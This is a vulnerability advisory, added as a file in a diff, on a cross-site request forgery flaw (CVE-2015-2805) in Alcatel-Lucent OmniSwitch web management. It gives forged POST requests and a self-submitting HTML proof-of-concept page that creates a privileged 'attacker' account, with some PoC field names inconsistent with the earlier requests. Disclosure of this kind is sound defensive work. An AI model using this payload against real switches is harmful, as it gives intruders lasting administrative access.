@@ -1,0 +1,206 @@
+Advisory: Alcatel-Lucent OmniSwitch Web Interface Cross-Site Request Forgery
+
+During a penetration test, RedTeam Pentesting discovered a vulnerability
+in the management web interface of an Alcatel-Lucent OmniSwitch 6450.
+The management web interface has no protection against cross-site
+request forgery attacks. This allows specially crafted web pages to
+change the switch configuration and create users, if an administrator
+accesses the website while being authenticated in the management web
+interface.
+
+Details
+=======
+
+Product: Alcatel-Lucent OmniSwitch 6450, 6250, 6850E, 9000E, 6400,
+  6855, 6900, 10K, 6860
+Affected Versions: All Releases:
+  AOS 6.4.5.R02
+  AOS 6.4.6.R01
+  AOS 6.6.4.R01
+  AOS 6.6.5.R02
+  AOS 7.3.2.R01
+  AOS 7.3.3.R01
+  AOS 7.3.4.R01
+  AOS 8.1.1.R01
+Fixed Versions: -
+Vulnerability Type: Cross-site request forgery
+Security Risk: medium
+Vendor URL: http://enterprise.alcatel-lucent.com/?product=OmniSwitch6450&page=overview
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-004
+Advisory Status: published
+CVE: CVE-2015-2805
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2805
+
+
+Introduction
+============
+
+"The Alcatel-Lucent OmniSwitch 6450 Gigabit and Fast Ethernet Stackable
+LAN Switches are the latest value stackable switches in the OmniSwitch
+family of products. The OmniSwitch 6450 was specifically built for
+versatility offering optional upgrade paths for 10 Gigabit stacking, 10
+Gigabit Ethernet uplinks, from Fast to Gigabit user ports (L models) and
+Metro Ethernet services."
+
+(from the vendor's homepage)
+
+More Details
+============
+
+The management web interface of the OmniSwitch 6450 can be accessed
+using a web browser via HTTP. The web interface allows creating new user
+accounts, in this case an HTTP request like the following is sent to the
+switch:
+
+  POST /sec/content/sec_asa_users_local_db_add.html HTTP/1.1
+  Host: 192.0.2.1
+  [...]
+  Cookie: session=sess_15739
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 214
+
+  EmWeb_ns:mip:2.T1:I1=attacker
+  &EmWeb_ns:mip:244.T1:O1=secret
+  &EmWeb_ns:mip:246.T1:O2=-1
+  &EmWeb_ns:mip:248.T1:O3=
+  &EmWeb_ns:mip:249.T1:O4=1
+  &EmWeb_ns:mip:250.T1:O5=4
+
+This request creates a user "attacker" with the password "secret". All
+other parametres are static. All POST parametres can be predicted by
+attackers
+
+This means that requests of this form can be prepared by attackers and sent
+from any web page the user visits in the same browser. If the user is
+authenticated to the switch, a valid session cookie is included in the request
+automatically, and the action is performed.
+
+In order to activate the new user for the web interface it is necessary
+to enable the respective access privileges in the user's profile. This can also
+be done via the web interface. Then the HTTP POST request looks like the
+following:
+
+  POST /sec/content/os6250_sec_asa_users_local_db_family_mod.html HTTP/1.1
+  Host: 192.0.2.1
+  [...]
+  Cookie: session=sess_15739
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 167
+
+  EmWeb_ns:mip:2.T1:I1=attacker
+  &EmWeb_ns:mip:4.T1:O1=
+  &EmWeb_ns:mip:5.T1:O2=
+  &EmWeb_ns:mip:6.T1:O3=4294967295
+  &EmWeb_ns:mip:7.T1:O4=4294967295
+
+This request sets all access privileges for the user "attacker" and
+is again completely predictable.
+
+
+Proof of Concept
+================
+
+Visiting the following HTML page will create a new user via the switch's
+management web interface, if the user is authenticated at the switch:
+
+------------------------------------------------------------------------
+<html>
+<head>
+<title>Alcatel-Lucent OmniSwitch 6450 create user via CSRF</title>
+</head>
+<body>
+  <form action="http://192.0.2.1/sec/content/sec_asa_users_local_db_add.html"
+  method="POST" id="CSRF" style="visibility:hidden">
+    <input type="hidden" name="EmWeb_ns:mip:2.T1:I1" value="attacker" />
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O1" value="secret" />
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O2" value="-1" />
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O3" value="" />
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O4" value="1" />
+    <input type="hidden" name="EmWeb_ns:mip:244.T1:O5" value="4" />
+  </form>
+<script>
+document.getElementById("CSRF").submit();
+</script>
+</body>
+</html>
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+Disable the web interface by executing the following commands:
+
+AOS6:
+
+  no ip service http
+  no ip service secure-http
+
+AOS 7/8:
+
+  ip service http admin-state disable
+
+If this is not possible, use a dedicated browser or browser profile for
+managing the switch via the web interface.
+
+
+Fix
+===
+
+Upgrade the firmware to a fixed version, according to the vendor the
+fixed versions will be available at the end of July 2015.
+
+
+Security Risk
+=============
+
+If attackers trick a logged-in administrator to visit an attacker-controlled 
+web page, the attacker can perform actions and reconfigure the switch. In this
+situation an attacker can create an additional user account on the switch for
+future access. While a successful attack results in full access to the switch,
+the attack is hard to exploit because attackers need to know the IP address of
+the switch and get an administrative user to access an attacker-controlled web
+page. The vulnerability is therefore rated as a medium risk.
+
+
+Timeline
+========
+
+2015-03-16 Vulnerability identified
+2015-03-25 Customer approves disclosure to vendor
+2015-03-26 CVE number requested
+2015-03-31 CVE number assigned
+2015-04-01 Vendor notified
+2015-04-02 Vendor acknowledged receipt of advisories
+2015-04-08 Requested status update from vendor, vendor is investigating
+2015-04-29 Requested status update from vendor, vendor is still investigating
+2015-05-22 Requested status update from vendor
+2015-05-27 Vendor is working on the issue
+2015-06-05 Vendor notified customers
+2015-06-08 Vendor provided details about affected versions
+2015-06-10 Advisory released
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at
+https://www.redteam-pentesting.de.
+
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Dennewartstr. 25-27                       Fax : +49 241 510081-99
+52068 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
